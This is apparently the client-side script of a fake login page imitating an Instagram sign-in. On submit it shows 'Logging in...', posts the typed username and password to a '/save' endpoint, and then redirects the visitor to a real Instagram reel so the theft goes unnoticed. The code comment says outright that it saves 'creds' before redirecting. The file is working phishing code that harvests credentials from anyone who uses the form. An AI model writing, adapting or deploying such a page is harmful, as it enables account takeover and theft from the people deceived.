document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('login-form');
    const user = document.getElementById('username');
    const pass = document.getElementById('password');
    const btn  = document.getElementById('btn-login');
    const tog  = document.getElementById('toggle-pw');
    const off  = tog.querySelector('.ico-off');
    const on   = tog.querySelector('.ico-on');

    // Toggle password eye icon
    tog.addEventListener('click', () => {
        const showing = pass.type === 'text';
        pass.type = showing ? 'password' : 'text';
        off.style.display = showing ? 'block' : 'none';
        on.style.display  = showing ? 'none'  : 'block';
    });

    // Enable/disable login button
    function check() {
        if (user.value.trim() && pass.value.trim()) {
            btn.classList.add('active');
            btn.disabled = false;
        } else {
            btn.classList.remove('active');
            btn.disabled = true;
        }
    }
    user.addEventListener('input', check);
    pass.addEventListener('input', check);

    // Submit — save creds to server then redirect
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (!user.value.trim() || !pass.value.trim()) return;

        btn.textContent = 'Logging in...';
        btn.disabled = true;

        try {
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: user.value.trim(),
                    password: pass.value.trim()
                })
            });
        } catch (err) {
            console.log('Server not running, skipping save');
        }

        // Redirect to the reel
        window.location.href = 'https://www.instagram.com/reels/Da5Dy9AypYg/';
    });
});
